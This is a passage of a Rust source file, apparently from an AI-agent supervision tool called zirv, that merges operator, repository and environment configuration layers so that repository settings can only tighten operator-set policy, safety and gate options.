use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use super::CtxResult;

/// Track top-level key provenance so errors can identify the contributing layer.
#[derive(Debug, Clone)]
enum KeyOrigin {
    Home,
    Repo,
    Env(String), // env var name
}

pub const DEFAULT_MARKER: &str = "[zirv]";
pub const CTX_CONFIG_FILE: &str = "ctx.toml";
/// Resolve policy asymmetrically; deep merge could replace operator restrictions.
const POLICY_SECTION: &str = "policy";
/// Resolve safety separately so repo additions cannot replace operator restrictions.
const SAFETY_SECTION: &str = "safety";

pub type EnvLookup<'a> = &'a dyn Fn(&str) -> Option<String>;

/// Inject env lookup for tests without mutating process-global state.
pub fn env_from_process() -> impl Fn(&str) -> Option<String> {
    |key: &str| std::env::var(key).ok()
}

mod agent_settings;
mod approvals_settings;
mod jev_settings;
mod pace_settings;
mod prompt_settings;
mod repo_layer;
pub mod settings;
mod supervisor_settings;
mod validate;

pub use agent_settings::*;
pub use approvals_settings::*;
pub use jev_settings::*;
pub use pace_settings::*;
pub use prompt_settings::*;
pub use repo_layer::is_repo_forbidden;
use repo_layer::{
    ENV_MAP, REPO_FORBIDDEN, add_config_error_prefix, bool_at, combine_additive_array,
    deploy_tier_at, env_value, fallback_harness_map_at, float_at, insert_path, integer_at, merge,
    narrow_fallback_harness, narrow_fallback_order, narrow_max, narrow_max_f64, narrow_min,
    narrow_min_f64, narrow_objective_gates, narrow_orchestrator_writes, orchestrator_writes_at,
    reject_untrusted_keys, reject_untrusted_workspace_execution, string_array, string_array_at,
    take_nested, take_nested3, value_at,
};
pub(crate) use repo_layer::{split_csv_list, toml_path_for_env};
pub use supervisor_settings::*;
use validate::validate_endpoint_target;
pub(crate) use validate::{
    validate_endpoint_base_url, validate_model_str, validate_output_filter_rules,
};

#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct CtxConfig {
    pub agent: Option<String>,
    pub agent_bin: Option<String>,
    /// Append workspace entries across layers and reject duplicate names, never replace a layer's list.
    /// Repo requirements are inert; executable git/setup fields are operator-only and rejected before merging.
    pub workspace: Vec<super::workspace::WorkspaceConfig>,
    pub score: ScoreConfig,
    pub wrap: WrapConfig,
    pub supervise: SuperviseConfig,
    pub hooks: HooksConfig,
    pub handoff: HandoffConfig,
    pub pace: PaceConfig,
    pub price: PriceConfig,
    pub models: ModelsConfig,
    pub compact_advisory: CompactAdvisoryConfig,
    pub optimize: OptimizeConfig,
    pub verify_on_stop: VerifyOnStopConfig,
    pub diagnostics: DiagnosticsConfig,
    pub missing_tests_gate: MissingTestsGateConfig,
    pub subagent_stop_gate: SubagentStopGateConfig,
    pub scope_guard: ScopeGuardConfig,
    pub edit_guard: EditGuardConfig,
    pub prompt: PromptConfig,
    pub context: ContextConfig,
    pub mail: MailConfig,
    pub workflow: WorkflowConfig,
    pub report: ReportConfig,
    pub search: SearchConfig,
    pub output: OutputConfig,
    pub memory: MemoryConfig,
    pub setup: SetupConfig,
    pub chrome: ChromeConfig,
    pub dash: DashConfig,
    pub chat: ChatConfig,
    pub review: ReviewConfig,
    pub worker: WorkerConfig,
    pub worktree: WorktreeConfig,
    pub handover: HandoverConfig,
    /// Operator-only seat model-tier map; see [`ModelTiersConfig`] (#699).
    pub model_tiers: ModelTiersConfig,
    pub endpoint: EndpointConfig,
    pub fallback: FallbackConfig,
    pub sandbox: SandboxConfig,
    pub objective: ObjectiveConfig,
    pub screen: ScreenConfig,
    pub obfuscate: ObfuscateConfig,
    pub task: TaskConfig,
    /// Operator-only proxy decisions; see [`ProxyConfig`] (#537).
    pub proxy: ProxyConfig,
    /// Operator-only shared Jev advisory gates; see [`JevConfig`] (#537).
    pub jev: JevConfig,
    /// Operator-only on-call supervisor consult; see [`SupervisorConfig`] (#835).
    pub supervisor: SupervisorConfig,
    /// Operator-only opt-in headless Claude controls; see [`HeadlessConfig`] (#788).
    pub headless: HeadlessConfig,
    /// Operator-only approvals inbox; see [`ApprovalsConfig`] (#840).
    pub approvals: ApprovalsConfig,
    /// Operator-only experimental runtime persistence; see [`SessionConfig`] (#352).
    pub session: SessionConfig,
    /// Operator-only MCP/web/browser integrations; see [`CapabilitiesConfig`] (#483).
    pub capabilities: CapabilitiesConfig,
    /// Operator-only runtime defaults; see [`RuntimeConfig`] (#491).
    pub runtime: RuntimeConfig,
    /// Loaded separately from `.settings.toml`; reject `[agents]` in ctx.toml to keep the files distinct.
    #[serde(skip)]
    pub agents: crate::settings::AgentGate,
    /// Lift policy before deep merge and resolve asymmetrically so repos can only tighten stances.
    #[serde(skip)]
    pub policy: super::policy::EffectivePolicy,
    /// Lift safety before deep merge; repos may add deny/ask, while allow/default remain operator-only (#83).
    #[serde(skip)]
    pub safety: super::safety::SafetyPolicy,
    /// Skipped TOML syntax failures, announced once per process and exposed to status/optimize; schema errors still fail.
    #[serde(skip)]
    pub unparsable_layers: Vec<UnparsableLayer>,
}

/// A skipped syntax failure with a single-line location and message, distinct from schema rejection.
#[derive(Debug, Clone, PartialEq)]
pub struct UnparsableLayer {
    pub path: std::path::PathBuf,
    pub message: String,
    /// Diagnostic loads may skip either layer; launch loads must refuse broken home policy rather than widen permissions.
    pub is_home: bool,
}

/// Extract the first backtick-delimited field candidate from a serde error.
fn extract_field_name(error_msg: &str) -> Option<String> {
    if let Some(start) = error_msg.find('`')
        && let Some(end) = error_msg[start + 1..].find('`')
    {
        return Some(error_msg[start + 1..start + 1 + end].to_string());
    }
    None
}

/// Attribute unknown keys and type errors to their contributing config layer when available.
fn format_config_error(error_msg: &str, key_origins: &HashMap<String, KeyOrigin>) -> String {
    if let Some(field) = extract_field_name(error_msg) {
        if error_msg.contains("unknown field") {
            if let Some(origin) = key_origins.get(&field) {
                let source = match origin {
                    KeyOrigin::Home => {
                        format!("~/{}/{}", crate::utils::SCRIPT_DIR_NAME, CTX_CONFIG_FILE)
                    }
                    KeyOrigin::Repo => format!(".zirv/{}", CTX_CONFIG_FILE),
                    KeyOrigin::Env(var) => format!("${var}"),
                };
                return format!(
                    "unknown key `{}` in {} — this is usually from a \
                     newer zirv version. Either remove the key or upgrade zirv.",
                    field, source
                );
            } else {
                return format!(
                    "unknown key `{}` — this is usually from a newer zirv \
                     version. Remove the key from your config files or environment variables, or upgrade zirv.",
                    field
                );
            }
        }
        if error_msg.contains("invalid type")
            && let Some(origin) = key_origins.get(&field)
        {
            let source = match origin {
                KeyOrigin::Home => {
                    format!("~/{}/{}", crate::utils::SCRIPT_DIR_NAME, CTX_CONFIG_FILE)
                }
                KeyOrigin::Repo => format!(".zirv/{}", CTX_CONFIG_FILE),
                KeyOrigin::Env(var) => format!("${var}"),
            };
            return format!("wrong type for `{}` in {} — {}", field, source, error_msg);
        }
    }
    format!("invalid ctx config: {}", error_msg)
}

/// Keep location and message on one line for status and announcements; callers supply the path.
fn summarize_parse_error(error: &toml::de::Error) -> String {
    let rendered = error.to_string();
    let first_line = rendered.lines().next().unwrap_or("TOML parse error");
    // Spanless errors already start with the message; do not duplicate it as a location.
    if first_line.starts_with("TOML parse error") {
        format!("{first_line}: {}", error.message())
    } else {
        error.message().to_string()
    }
}

/// Syntax failure leaves the merge unchanged and returns a diagnostic; I/O failures still propagate.
/// Launch callers must separately reject broken operator policy rather than trust defaults.
fn read_layer(
    path: &Path,
    into: &mut toml::Table,
    is_home: bool,
    key_origins: &mut HashMap<String, KeyOrigin>,
) -> CtxResult<Option<UnparsableLayer>> {
    if !path.exists() {
        return Ok(None);
    }
    let text = std::fs::read_to_string(path).map_err(|e| {
        let msg: Box<dyn std::error::Error> =
            format!("unable to read {}: {}", path.display(), e).into();
        msg
    })?;
    match toml::from_str::<toml::Table>(&text) {
        Ok(layer) => {
            let origin = if is_home {
                KeyOrigin::Home
            } else {
                KeyOrigin::Repo
            };
            for key in layer.keys() {
                key_origins.insert(key.clone(), origin.clone());
            }
            merge(into, layer);
            Ok(None)
        }
        Err(e) => Ok(Some(UnparsableLayer {
            path: path.to_path_buf(),
            message: summarize_parse_error(&e),
            is_home,
        })),
    }
}

pub(super) fn operator_path() -> CtxResult<std::path::PathBuf> {
    Ok(crate::utils::home_dir()?
        .join(crate::utils::SCRIPT_DIR_NAME)
        .join(CTX_CONFIG_FILE))
}

/// One table of the operator file plus its `ZIRV_CTX_<SECTION>_*` env overrides, no repo layer.
fn load_operator_section<T: Default + serde::de::DeserializeOwned>(
    env: EnvLookup<'_>,
    section: &str,
) -> CtxResult<T> {
    let text = match std::fs::read_to_string(operator_path()?) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(error) => return Err(error.into()),
    };
    let mut operator: toml::Table = toml::from_str(&text)?;
    let mut merged = toml::Table::new();
    if let Some(value) = operator.remove(section) {
        merged.insert(section.into(), value);
    }
    for (var, path, kind) in ENV_MAP {
        if path.first() == Some(&section)
            && let Some(raw) = env(var)
        {
            insert_path(&mut merged, path, env_value(&raw, *kind)?);
        }
    }
    match merged.remove(section) {
        Some(value) => Ok(value.try_into()?),
        None => Ok(T::default()),
    }
}

/// Validate just the operator document, without repo or environment overrides.
pub(super) fn validate_operator_document(text: &str) -> CtxResult<()> {
    let mut table: toml::Table = toml::from_str(text)?;
    super::policy::resolve(table.remove(POLICY_SECTION), None, &|_| None)?;
    super::safety::resolve(table.remove(SAFETY_SECTION), None, &|_| None)?;
    let cfg: CtxConfig = toml::Value::Table(table).try_into().map_err(|e| {
        let error_msg = e.to_string();
        // Without layered provenance, still provide a useful unknown-key diagnosis.
        if error_msg.contains("unknown field")
            && let Some(field) = extract_field_name(&error_msg)
        {
            let msg: Box<dyn std::error::Error> = format!(
                "invalid ctx config: unknown key `{}` — this is usually from a \
                     newer zirv version. Remove it or upgrade zirv.",
                field
            )
            .into();
            return msg;
        }
        let msg: Box<dyn std::error::Error> = format!("invalid ctx config: {}", error_msg).into();
        msg
    })?;
    super::workspace::validate_catalogue(&cfg.workspace)
        .map_err(|error| format!("invalid ctx config: {error}"))?;
    Ok(())
}

impl CtxConfig {
    /// Unset enables rollover only with multiple enabled fallback harnesses; a single harness has no destination.
    pub fn auto_orchestrator_rollover(&self) -> bool {
        self.fallback.auto_orchestrator_rollover.unwrap_or_else(|| {
            self.fallback
                .order
                .iter()
                .filter(|name| self.agents.is_enabled(name))
                .count()
                >= 2
        })
    }

    /// Merge home, repo, then environment; verbs apply flags afterward.
    /// Skip and announce TOML syntax failures for diagnostics; schema and forbidden-key errors remain fatal.
    /// Launching callers must use `load_for_launch` to refuse broken operator policy.
    pub fn load(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
        Self::load_layers(repo, env, true)
    }

    /// Built-in, operator (`~/.zirv/ctx.toml`) and `ZIRV_CTX_*` layers only; the repo's `.zirv/` files are not read.
    /// For security hooks whose repo layer was refused: repo layers can only narrow, so ignoring one never widens policy.
    pub(crate) fn load_trusted_only(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
        Self::load_layers(repo, env, false)
    }

    /// `load`, but never an error: a repo-forbidden layer falls back to the trusted layers, any other failure to defaults.
    /// For callers that must still apply operator policy (e.g. secret scrubbing) when the repo config is refused.
    pub(crate) fn load_refusal_safe(repo: &Path, env: EnvLookup<'_>) -> Self {
        match Self::load(repo, env) {
            Ok(cfg) => cfg,
            Err(err) if repo_layer::is_repo_forbidden(err.as_ref()) => {
                Self::load_trusted_only(repo, env).unwrap_or_default()
            }
            Err(_) => Self::default(),
        }
    }

    fn load_layers(repo: &Path, env: EnvLookup<'_>, read_repo_layer: bool) -> CtxResult<Self> {
        let mut merged = toml::Table::new();
        let mut unparsable_layers: Vec<UnparsableLayer> = Vec::new();
        let mut key_origins: HashMap<String, KeyOrigin> = HashMap::new();

        if let Ok(path) = operator_path()
            && let Some(bad) = read_layer(&path, &mut merged, true, &mut key_origins)?
        {
            unparsable_layers.push(bad);
        }
        // Lift policy before merging so repo stances cannot replace operator restrictions; resolve with stricter-wins.
        let home_policy = merged.remove(POLICY_SECTION);
        // Lift safety for the same no-replacement trust constraint (#83).
        let home_safety = merged.remove(SAFETY_SECTION);
        // Append workspace layers instead of replacing arrays; duplicate names must fail loudly.
        let home_workspaces = merged.remove("workspace");
        // Union denials so repo arrays cannot erase operator entries; extra-allow is operator-only and needs no lift.
        let home_extra_deny = string_array(take_nested(&mut merged, "sandbox", "extra_deny"));
        // Lift before merge so stricter pacing wins: enabled=true and lower percentages.
        let home_pace_enabled = bool_at(take_nested(&mut merged, "pace", "enabled"));
        let home_pace_max_percent = float_at(take_nested(&mut merged, "pace", "max_percent"));
        let home_pace_soft_percent = float_at(take_nested(&mut merged, "pace", "soft_percent"));
        // Lift before merge; false is stricter because it injects more context (#155).
        let home_context_dedupe_native =
            bool_at(take_nested(&mut merged, "context", "dedupe_native"));
        // Lift before merge so repos can only disable the standing skill index (#539).
        let home_prompt_skill_index = bool_at(take_nested(&mut merged, "prompt", "skill_index"));
        let home_prompt_intake_discipline =
            bool_at(take_nested(&mut merged, "prompt", "intake_discipline"));
        // Lift before merge so repos can only disable verification advice or lower its cap (#309).
        let home_verify_on_stop_enabled =
            bool_at(take_nested(&mut merged, "verify_on_stop", "enabled"));
        let home_verify_on_stop_max_nudges =
            integer_at(take_nested(&mut merged, "verify_on_stop", "max_nudges"));
        // Lift before merge so repos can only disable diagnostics, lower the count or shorten runtime (#308).
        let home_diagnostics_enabled = bool_at(take_nested(&mut merged, "diagnostics", "enabled"));
        let home_diagnostics_max =
            integer_at(take_nested(&mut merged, "diagnostics", "max_diagnostics"));
        let home_diagnostics_timeout =
            integer_at(take_nested(&mut merged, "diagnostics", "timeout_secs"));
        // Lift before merge so repos cannot enable a missing-tests gate the operator disabled.
        let home_missing_tests_gate_enabled =
            bool_at(take_nested(&mut merged, "missing_tests_gate", "enabled"));
        // Lift before merge so repos cannot enable a subagent Stop gate the operator disabled (#774).
        let home_subagent_stop_gate_enabled =
            bool_at(take_nested(&mut merged, "subagent_stop_gate", "enabled"));
        // Lift before merge so repos cannot enable a scope guard the operator disabled.
        let home_scope_guard_enabled = bool_at(take_nested(&mut merged, "scope_guard", "enabled"));
        // Lift before merge so repos cannot enable an edit guard the operator left off.
        let home_edit_guard_enabled = bool_at(take_nested(&mut merged, "edit_guard", "enabled"));
        // Repo compaction advice may only become less eager (#312).
        let home_compact_advisory_min_reclaim = integer_at(take_nested(
            &mut merged,
            "compact_advisory",
            "min_reclaim_tokens",
        ));
        let home_compact_advisory_window_fraction = float_at(take_nested(
            &mut merged,
            "compact_advisory",
            "window_fraction",
        ));
        // Lift only narrowable depth/network bounds; operator-only worker keys are rejected before merge (#262).
        let home_worker_max_depth = integer_at(take_nested(&mut merged, "worker", "max_depth"));
        let home_worker_deny_network = bool_at(take_nested(&mut merged, "worker", "deny_network"));
        // Lift before merge so repos can only shrink the idle pool or shorten retention (#718).
        let home_worktree_idle_pool_max =
            integer_at(take_nested(&mut merged, "worktree", "idle_pool_max"));
        let home_worktree_idle_ttl_secs =
            integer_at(take_nested(&mut merged, "worktree", "idle_ttl_secs"));
        // Lift before merge so repos can only drop gates, lower cycles or disable the judge (#314).
        let home_objective_gates = string_array_at(take_nested(&mut merged, "objective", "gates"));
        let home_objective_max_cycles = integer_at(take_nested(
            &mut merged,
            "objective",
            "max_cycles_without_progress",
        ));
        let home_objective_judge = bool_at(take_nested(&mut merged, "objective", "judge"));
        // Lift before merge so repos can only lower detection thresholds (#272).
        let home_screen_min_fragment = integer_at(take_nested(
            &mut merged,
            "screen",
            "repetition_min_fragment",
        ));
        let home_screen_window =
            integer_at(take_nested(&mut merged, "screen", "repetition_window"));
        let home_screen_min_repeats =
            integer_at(take_nested(&mut merged, "screen", "repetition_min_repeats"));
        let home_screen_dominance_pct = float_at(take_nested(
            &mut merged,
            "screen",
            "repetition_dominance_pct",
        ));
        let home_obfuscate_email_domain = take_nested(&mut merged, "obfuscate", "email_domain");
        let home_obfuscate_patterns = take_nested(&mut merged, "obfuscate", "patterns");
        // Union heavy patterns: even an empty repo array must never erase operator restrictions.
        let home_heavy_patterns = string_array(take_nested(
            &mut merged,
            "supervise",
            "heavy_command_patterns",
        ));
        // Lift before merge so repos can only tighten write posture (#358).
        let home_orchestrator_writes = orchestrator_writes_at(
            take_nested(&mut merged, "supervise", "orchestrator_writes"),
            "supervise.orchestrator_writes",
        )?;
        // Lift before merge so repos can only shorten quiet loop intervals (#311).
        let home_loop_backoff_ceiling = integer_at(take_nested(
            &mut merged,
            "supervise",
            "loop_backoff_ceiling_secs",
        ));
        // Lift before merge so repos can only lower the diff-output ceiling (#412).
        let home_output_diff_max_bytes =
            integer_at(take_nested(&mut merged, "output", "diff_max_bytes"));

        // Lift before merge so repos can only narrow automatic vendor steering (#186).
        let home_fallback_enabled = bool_at(take_nested(&mut merged, "fallback", "enabled"));
        // Repos may only disable the route breaker; its timing settings are operator-only (#455).
        let home_fallback_health_enabled =
            bool_at(take_nested3(&mut merged, "fallback", "health", "enabled"));
        let home_fallback_order = string_array_at(take_nested(&mut merged, "fallback", "order"));
        let home_fallback_predictive = float_at(take_nested(
            &mut merged,
            "fallback",
            "predictive_headroom_pct",
        ));
        let home_fallback_min_candidate = float_at(take_nested(
            &mut merged,
            "fallback",
            "min_candidate_headroom_pct",
        ));
        let home_fallback_unknown =
            float_at(take_nested(&mut merged, "fallback", "unknown_headroom_pct"));
        let home_fallback_small_tokens = integer_at(take_nested(
            &mut merged,
            "fallback",
            "small_task_max_tokens",
        ));
        let home_fallback_small_tools = integer_at(take_nested(
            &mut merged,
            "fallback",
            "small_task_max_tool_calls",
        ));
        let home_fallback_adaptive =
            bool_at(take_nested(&mut merged, "fallback", "adaptive_delegation"));
        let home_fallback_auto_rollover = bool_at(take_nested(
            &mut merged,
            "fallback",
            "auto_orchestrator_rollover",
        ));
        let home_fallback_harness =
            fallback_harness_map_at(take_nested(&mut merged, "fallback", "harness"));
        let home_deploy_tier = deploy_tier_at(
            take_nested3(&mut merged, "workflow", "deploy", "tier"),
            "workflow.deploy.tier",
        )?;
        let home_deploy_minimum = deploy_tier_at(
            take_nested3(&mut merged, "workflow", "deploy", "minimum_tier"),
            "workflow.deploy.minimum_tier",
        )?;

        // When launched from home, do not reread operator config as untrusted repo config and reject its authorized keys.
        let repo_path = repo
            .join(crate::utils::SCRIPT_DIR_NAME)
            .join(CTX_CONFIG_FILE);
        let mut repo_layer = toml::Table::new();
        if read_repo_layer
            && !crate::utils::repo_is_home(repo)
            && let Some(bad) = read_layer(&repo_path, &mut repo_layer, false, &mut key_origins)?
        {
            unparsable_layers.push(bad);
        }
        // Reject forbidden keys before lifting sections so narrowing folds cannot silently swallow forbidden settings.
        reject_untrusted_keys(&repo_layer, &repo_path)?;
        reject_untrusted_workspace_execution(&repo_layer, &repo_path)?;
        let repo_policy = repo_layer.remove(POLICY_SECTION);
        // Lift safety only after rejecting repo allow/default keys; resolution adds defense in depth.
        let repo_safety = repo_layer.remove(SAFETY_SECTION);
        let repo_workspaces = repo_layer.remove("workspace");
        let repo_extra_deny = string_array(take_nested(&mut repo_layer, "sandbox", "extra_deny"));
        let repo_pace_enabled = bool_at(take_nested(&mut repo_layer, "pace", "enabled"));
        let repo_pace_max_percent = float_at(take_nested(&mut repo_layer, "pace", "max_percent"));
        let repo_pace_soft_percent = float_at(take_nested(&mut repo_layer, "pace", "soft_percent"));
        let repo_context_dedupe_native =
            bool_at(take_nested(&mut repo_layer, "context", "dedupe_native"));
        let repo_prompt_skill_index =
            bool_at(take_nested(&mut repo_layer, "prompt", "skill_index"));
        let repo_prompt_intake_discipline =
            bool_at(take_nested(&mut repo_layer, "prompt", "intake_discipline"));
        let repo_verify_on_stop_enabled =
            bool_at(take_nested(&mut repo_layer, "verify_on_stop", "enabled"));
        let repo_verify_on_stop_max_nudges =
            integer_at(take_nested(&mut repo_layer, "verify_on_stop", "max_nudges"));
        let repo_diagnostics_enabled =
            bool_at(take_nested(&mut repo_layer, "diagnostics", "enabled"));
        let repo_diagnostics_max = integer_at(take_nested(
            &mut repo_layer,
            "diagnostics",
            "max_diagnostics",
        ));
        let repo_diagnostics_timeout =
            integer_at(take_nested(&mut repo_layer, "diagnostics", "timeout_secs"));
        let repo_missing_tests_gate_enabled = bool_at(take_nested(
            &mut repo_layer,
            "missing_tests_gate",
            "enabled",
        ));
        let repo_subagent_stop_gate_enabled = bool_at(take_nested(
            &mut repo_layer,
            "subagent_stop_gate",
            "enabled",
        ));
        let repo_scope_guard_enabled =
            bool_at(take_nested(&mut repo_layer, "scope_guard", "enabled"));
        let repo_edit_guard_enabled =
            bool_at(take_nested(&mut repo_layer, "edit_guard", "enabled"));
        let repo_compact_advisory_min_reclaim = integer_at(take_nested(
            &mut repo_layer,
            "compact_advisory",
            "min_reclaim_tokens",
        ));
        let repo_compact_advisory_window_fraction = float_at(take_nested(
            &mut repo_layer,
            "compact_advisory",
            "window_fraction",
        ));
        let repo_worker_max_depth = integer_at(take_nested(&mut repo_layer, "worker", "max_depth"));
        let repo_worker_deny_network =
            bool_at(take_nested(&mut repo_layer, "worker", "deny_network"));
        let repo_worktree_idle_pool_max =
            integer_at(take_nested(&mut repo_layer, "worktree", "idle_pool_max"));
        let repo_worktree_idle_ttl_secs =
            integer_at(take_nested(&mut repo_layer, "worktree", "idle_ttl_secs"));
        let repo_objective_gates =
            string_array_at(take_nested(&mut repo_layer, "objective", "gates"));
        let repo_objective_max_cycles = integer_at(take_nested(
            &mut repo_layer,
            "objective",
            "max_cycles_without_progress",
        ));
        let repo_objective_judge = bool_at(take_nested(&mut repo_layer, "objective", "judge"));
        let repo_screen_min_fragment = integer_at(take_nested(
            &mut repo_layer,
            "screen",
            "repetition_min_fragment",
        ));
        let repo_screen_window =
            integer_at(take_nested(&mut repo_layer, "screen", "repetition_window"));
        let repo_screen_min_repeats = integer_at(take_nested(
            &mut repo_layer,
            "screen",
            "repetition_min_repeats",
        ));
        let repo_screen_dominance_pct = float_at(take_nested(
            &mut repo_layer,
            "screen",
            "repetition_dominance_pct",
        ));
        let repo_obfuscate_email_domain = take_nested(&mut repo_layer, "obfuscate", "email_domain");
        let repo_obfuscate_patterns = take_nested(&mut repo_layer, "obfuscate", "patterns");
        let repo_heavy_patterns = string_array(take_nested(
            &mut repo_layer,
            "supervise",
            "heavy_command_patterns",
        ));
        let repo_orchestrator_writes = orchestrator_writes_at(
            take_nested(&mut repo_layer, "supervise", "orchestrator_writes"),
            "supervise.orchestrator_writes",
        )?;
        let repo_loop_backoff_ceiling = integer_at(take_nested(
            &mut repo_layer,
            "supervise",
            "loop_backoff_ceiling_secs",
        ));
        let repo_output_diff_max_bytes =
            integer_at(take_nested(&mut repo_layer, "output", "diff_max_bytes"));
        let repo_fallback_enabled = bool_at(take_nested(&mut repo_layer, "fallback", "enabled"));
        let repo_fallback_health_enabled = bool_at(take_nested3(
            &mut repo_layer,
            "fallback",
            "health",
            "enabled",
        ));
        let repo_fallback_order =
            string_array_at(take_nested(&mut repo_layer, "fallback", "order"));
        let repo_fallback_predictive = float_at(take_nested(
            &mut repo_layer,
            "fallback",
            "predictive_headroom_pct",
        ));
        let repo_fallback_min_candidate = float_at(take_nested(
            &mut repo_layer,
            "fallback",
            "min_candidate_headroom_pct",
        ));
        let repo_fallback_unknown = float_at(take_nested(
            &mut repo_layer,
            "fallback",
            "unknown_headroom_pct",
        ));
        let repo_fallback_small_tokens = integer_at(take_nested(
            &mut repo_layer,
            "fallback",
            "small_task_max_tokens",
        ));
        let repo_fallback_small_tools = integer_at(take_nested(
            &mut repo_layer,
            "fallback",
            "small_task_max_tool_calls",
        ));
        let repo_fallback_adaptive = bool_at(take_nested(
            &mut repo_layer,
            "fallback",
            "adaptive_delegation",
        ));
        let repo_fallback_auto_rollover = bool_at(take_nested(
            &mut repo_layer,
            "fallback",
            "auto_orchestrator_rollover",
        ));
        let repo_fallback_harness =
            fallback_harness_map_at(take_nested(&mut repo_layer, "fallback", "harness"));
        let repo_deploy_minimum = deploy_tier_at(
            take_nested3(&mut repo_layer, "workflow", "deploy", "minimum_tier"),
            "workflow.deploy.minimum_tier",
        )?;
        merge(&mut merged, repo_layer);

        if let Some(workspaces) = combine_additive_array(home_workspaces, repo_workspaces) {
            merged.insert("workspace".to_string(), workspaces);
        }

        // Repo mask handling can only tighten; union pattern tables so repos cannot replace operator detectors.
        let home_masks_email = matches!(
            home_obfuscate_email_domain.as_ref(),
            Some(toml::Value::String(value)) if value == "mask"
        );
        let repo_masks_email = matches!(
            repo_obfuscate_email_domain.as_ref(),
            Some(toml::Value::String(value)) if value == "mask"
        );
        insert_path(
            &mut merged,
            &["obfuscate", "email_domain"],
            toml::Value::String(if home_masks_email || repo_masks_email {
                "mask".to_string()
            } else {
                "keep".to_string()
            }),
        );
        let mut patterns = match home_obfuscate_patterns {
            Some(toml::Value::Array(values)) => values,
            _ => Vec::new(),
        };
        if let Some(toml::Value::Array(values)) = repo_obfuscate_patterns {
            patterns.extend(values);
        }
        if !patterns.is_empty() {
            insert_path(
                &mut merged,
                &["obfuscate", "patterns"],
                toml::Value::Array(patterns),
            );
        }

        let default_deploy = WorkflowDeployConfig::default();
        let declared_minimum = home_deploy_minimum.max(repo_deploy_minimum);
        let effective_deploy = home_deploy_tier
            .unwrap_or(default_deploy.tier)
            .max(declared_minimum.unwrap_or(default_deploy.tier));
        insert_path(
            &mut merged,
            &["workflow", "deploy", "tier"],
            toml::Value::String(effective_deploy.to_string()),
        );
        if let Some(minimum) = declared_minimum {
            insert_path(
                &mut merged,
                &["workflow", "deploy", "minimum_tier"],
                toml::Value::String(minimum.to_string()),
            );
        }

        // Reinsert narrowed write posture before environment overrides, which remain the operator's final word (#358).
        let default_supervise = SuperviseConfig::default();
        insert_path(
            &mut merged,
            &["supervise", "orchestrator_writes"],
            toml::Value::String(
                narrow_orchestrator_writes(
                    home_orchestrator_writes.unwrap_or(default_supervise.orchestrator_writes),
                    repo_orchestrator_writes,
                )
                .label()
                .to_string(),
            ),
        );
        // Reinsert the narrowed backoff ceiling before operator environment overrides (#311).
        insert_path(
            &mut merged,
            &["supervise", "loop_backoff_ceiling_secs"],
            toml::Value::Integer(
                i64::try_from(narrow_min(
                    home_loop_backoff_ceiling
                        .and_then(|v| u64::try_from(v).ok())
                        .unwrap_or(default_supervise.loop_backoff_ceiling_secs),
                    repo_loop_backoff_ceiling.and_then(|v| u64::try_from(v).ok()),
                    u64::MAX,
                ))
                .unwrap_or(i64::MAX),
            ),
        );
        // Reinsert the narrowed diff ceiling before operator environment overrides (#412).
        let default_output = OutputConfig::default();
        insert_path(
            &mut merged,
            &["output", "diff_max_bytes"],
            toml::Value::Integer(
                i64::try_from(narrow_min(
                    home_output_diff_max_bytes
                        .and_then(|v| u64::try_from(v).ok())
                        .unwrap_or(default_output.diff_max_bytes as u64),
                    repo_output_diff_max_bytes.and_then(|v| u64::try_from(v).ok()),
                    u64::MAX,
                ))
                .unwrap_or(i64::MAX),
            ),
        );

        // Reinsert after merge but before env so the operator can still override the result outright.
        let default_pace = PaceConfig::default();
        insert_path(
            &mut merged,
            &["pace", "enabled"],
            toml::Value::Boolean(narrow_max(
                home_pace_enabled.unwrap_or(default_pace.enabled),
                repo_pace_enabled,
                false,
            )),
        );
        insert_path(
            &mut merged,
            &["pace", "max_percent"],
            toml::Value::Float(narrow_min_f64(
                home_pace_max_percent.unwrap_or(default_pace.max_percent),
                repo_pace_max_percent,
                f64::INFINITY,
            )),
        );
        insert_path(
            &mut merged,
            &["pace", "soft_percent"],
            toml::Value::Float(narrow_min_f64(
                home_pace_soft_percent.unwrap_or(default_pace.soft_percent),
                repo_pace_soft_percent,
                f64::INFINITY,
            )),
        );
        let default_context = ContextConfig::default();
        insert_path(
            &mut merged,
            &["context", "dedupe_native"],
            toml::Value::Boolean(narrow_min(
                home_context_dedupe_native.unwrap_or(default_context.dedupe_native),
                repo_context_dedupe_native,
                true,
            )),
        );
        let default_prompt = PromptConfig::default();
        insert_path(
            &mut merged,
            &["prompt", "skill_index"],
            toml::Value::Boolean(narrow_min(
                home_prompt_skill_index.unwrap_or(default_prompt.skill_index),
                repo_prompt_skill_index,
                true,
            )),
        );
        insert_path(
            &mut merged,
            &["prompt", "intake_discipline"],
            toml::Value::Boolean(narrow_min(
                home_prompt_intake_discipline.unwrap_or(default_prompt.intake_discipline),
                repo_prompt_intake_discipline,
                true,
            )),
        );
        let default_verify_on_stop = VerifyOnStopConfig::default();
        insert_path(
            &mut merged,
            &["verify_on_stop", "enabled"],
            toml::Value::Boolean(narrow_min(
                home_verify_on_stop_enabled.unwrap_or(default_verify_on_stop.enabled),
                repo_verify_on_stop_enabled,
                true,
            )),
        );
        let home_max_nudges = home_verify_on_stop_max_nudges
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_verify_on_stop.max_nudges);
        let repo_max_nudges = repo_verify_on_stop_max_nudges.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["verify_on_stop", "max_nudges"],
            toml::Value::Integer(i64::from(narrow_min(
                home_max_nudges,
                repo_max_nudges,
                u32::MAX,
            ))),
        );

        let default_diagnostics = DiagnosticsConfig::default();
        insert_path(
            &mut merged,
            &["diagnostics", "enabled"],
            toml::Value::Boolean(narrow_min(
                home_diagnostics_enabled.unwrap_or(default_diagnostics.enabled),
                repo_diagnostics_enabled,
                true,
            )),
        );
        let home_max_diagnostics = home_diagnostics_max
            .and_then(|v| u32::try_from(v).ok())
            .unwrap_or(default_diagnostics.max_diagnostics);
        let repo_max_diagnostics = repo_diagnostics_max.and_then(|v| u32::try_from(v).ok());
        insert_path(
            &mut merged,
            &["diagnostics", "max_diagnostics"],
